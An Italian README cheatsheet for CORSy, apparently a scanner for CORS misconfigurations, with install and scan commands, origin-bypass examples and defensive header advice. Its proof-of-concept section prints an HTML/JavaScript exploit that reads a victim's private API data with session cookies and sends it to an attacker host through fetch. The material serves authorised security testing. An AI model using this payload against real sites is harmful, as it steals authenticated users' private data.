<!-- language-home-navigation -->
[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🌐 CORSy - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
   ██████╗ ██████╗ ██████╗ ███████╗██╗   ██╗
  ██╔════╝██╔═══██╗██╔══██╗██╔════╝╚██╗ ██╔╝
  ██║     ██║   ██║██████╔╝███████╗ ╚████╔╝ 
  ██║     ██║   ██║██╔══██╗╚════██║  ╚██╔╝  
  ╚██████╗╚██████╔╝██║  ██║███████║   ██║   
   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝   
      Cross-Origin Resource Sharing (CORS) Misconfiguration Scanner
```
<palign="centro">
  <img src="https://img.shields.io/badge/CORSy-CORS_Scanner-blue?style=for-the-badge" alt="CORSy">
  <img src="https://img.shields.io/badge/Author-Somdev_Sangwan-orange?style=for-the-badge" alt="s0md3v">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Sicurezza Web">
  <img src="https://img.shields.io/badge/License-GPLv3-purple?style=for-the-badge" alt="GPLv3">
</p>

<palign="centro">
  <b>🌐 Strumento CLI veloce e completo progettato per rilevare configurazioni errate di condivisione delle risorse tra origini (CORS) e verificare i rischi di furto di dati tra origini</b>
</p>

---

## 📋 Sommario

- [Panoramica e nozioni di base sulla vulnerabilità CORS](#-panoramica--cors-vulnerabilità-nozioni di base)
  - [The Fatal Trio: Origin Reflection + Credentials True](#the-fatal-trio-origin-reflection--credentials-true)
- [Installazione](#-installazione)
- [Scansione di base del target](#-basic-target-scanning)
- [Vettore di attacco CORS testato](#-cors-attack-vettori-testato)
  - [Riflessione dell'origine arbitraria](#riflessione-origine-arbitraria)
  - [Confidenza con l'origine nulla (`Origin: null`)](#confidenza-null-origine-origine-null)
  - [Bypass regex prefisso e suffisso](#prefix--suffix-regex-bypass)
  - [Wildcard Subdomain Trust](#wildcard-subdomain-trust)
  - [Ignora caratteri speciali (`_`, `;`, `!`)](#esclusione-caratteri-speciali----)
- [Scansione multi-target ed esportazione dell'output](#-multi-target-scanning--output-export)
- [Creazione di exploit Proof-of-Concept (PoC)](#-crafting-proof-of-concept-poc-exploits)
- [Tabella di riferimento rapido](#-tabella-di-riferimento-rapido)
- [Considerazioni difensive e intestazioni sicure](#-considerazioni-difensive--secure-headers)
- [Disclaimer legale](#-legal-disclaimer)

---

## 🎯 Panoramica e nozioni di base sulla vulnerabilità CORS

**Cross-Origin Resource Sharing (CORS)** è un meccanismo di sicurezza del browser che consente ai server Web di allentare la **Same-Origin Policy (SOP)**. Restituendo intestazioni come:
-`Access-Control-Allow-Origin: <origin>`
-`Access-Control-Allow-Credentials: true`

Un'applicazione web concede ad altri siti web l'autorizzazione a leggere le sue risposte HTTP per conto dell'utente vittima.

### Il trio fatale: Riflessione sull'origine + Credenziali vere
Quando un'applicazione riflette ciecamente l'intestazione `Origin` in entrata in `Access-Control-Allow-Origin` e abilita `Access-Control-Allow-Credentials: true`, qualsiasi sito Web dannoso può forzare il browser di un visitatore autenticato a leggere messaggi privati, chiavi API e dettagli dell'account.

Creato da **Somdev Sangwan (s0md3v)**, **CORSy** analizza sistematicamente gli endpoint con oltre 16 permutazioni di origine note per individuare queste configurazioni errate.

---

## 📥Installazione
```bash
# Clone the repository
git clone https://github.com/s0md3v/Corsy.git
cd Corsy

# Install dependencies
pip install -r requirements.txt

# Run Corsy
python3 corsy.py -h
```
---

## 🚀 Scansione di base del bersaglio

Esegui la scansione di un singolo endpoint dell'applicazione Web:
```bash
python3 corsy.py -u https://target.com/api/user/details
```
Aggiungi intestazioni personalizzate o cookie di sessione:
```bash
python3 corsy.py -u https://target.com/api/user/details \
  --headers "Cookie: session=abc123xyz"
```
---

## ⚡ Testati i vettori di attacco CORS

CORSy testa automaticamente diversi modelli di permutazione dell'origine:

### Riflessione sull'origine arbitraria
Il server rispecchia ciecamente qualsiasi dominio:
```http
Request:
Origin: https://evil.com

Response:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```
### Fiducia nell'origine nulla (`Origin: null`)
Le applicazioni possono considerare attendibili le origini `null` (comuni con iframe sandbox locali o URL `data:`):
```http
Request:
Origin: null

Response:
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
*Può essere attivato caricando l'API della vittima da un iframe con `sandbox="allow-scripts allow-top-navigation"`.*

### Bypass regex prefisso e suffisso
Validazione regex scadente (ad esempio `.*target.com` o `target.com.*`):
-`https://target.com.attacker.com`
-`https://not-target.com`

### Esclusione caratteri speciali (`_`, `;`, `!`)
I browser e i server gestiscono i delimitatori URI in modo diverso:
-`https://target.com_.attacker.com`
-`https://target.com%60.attacker.com`

---

## 🌐 Scansione multi-target ed esportazione di output

Esegui la scansione di elenchi di grandi dimensioni di endpoint API scoperti dalla ricognizione:
```bash
# Scan a list of URLs with 10 concurrent threads
python3 corsy.py -i endpoints.txt -t 10

# Export results to clean JSON format
python3 corsy.py -i endpoints.txt -o cors_results.json
```
---

## 💻 Realizzazione di exploit Proof-of-Concept (PoC).

Quando CORSy conferma un'errata configurazione con le credenziali consentite, genera un exploit HTML per rubare dati sensibili:
```html
<!DOCTYPE html>
<html>
<body>
<h1>CORS Exploit Demo</h1>
<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
        // Exfiltrate stolen private response to attacker server
        fetch("https://attacker.com/log?data=" + encodeURIComponent(this.responseText));
    };
    req.open("GET", "https://target.com/api/user/private_data", true);
    req.withCredentials = true; // Crucial for sending session cookies
    req.send();
</script>
</body>
</html>
```
---

## ⚡ Tabella di consultazione rapida

| Obiettivo | Comando |
|-----------|---------|
| **Scansione URL singolo** | `python3 corsy.py -u <URL>` |
| **Scansione con cookie di sessione** | `python3 corsy.py -u <URL> --headers "Cookie: sess=123"` |
| **Elenco URL di scansione** | `python3 corsy.py -i targets.txt` |
| **Scansione multi-thread** | `python3 corsy.py -i targets.txt -t 20` |
| **Esporta in JSON** | `python3 corsy.py -i targets.txt -o results.json` |

---

## 🛡️ Considerazioni difensive e colpi di testa sicuri

1. **Non riflettere mai l'origine in modo arbitrario:** Confronta l'intestazione `Origin` con una whitelist lato server esplicita e rigorosa.
2. **Non associare mai i caratteri jolly alle credenziali:** Il browser blocca `Access-Control-Allow-Origin: *` con `Credentials: true`, ma non lo emula mai dinamicamente.
3. **Evita di affidare `null`:** non aggiungere `null` alle policy di origine attendibile.

---

## ⚠️ Disclaimer legale

> [!ATTENZIONE]
> CORSy è destinato esclusivamente a valutazioni di sicurezza autorizzate, test di penetrazione e audit difensivi. Testare siti web senza autorizzazione è illegale.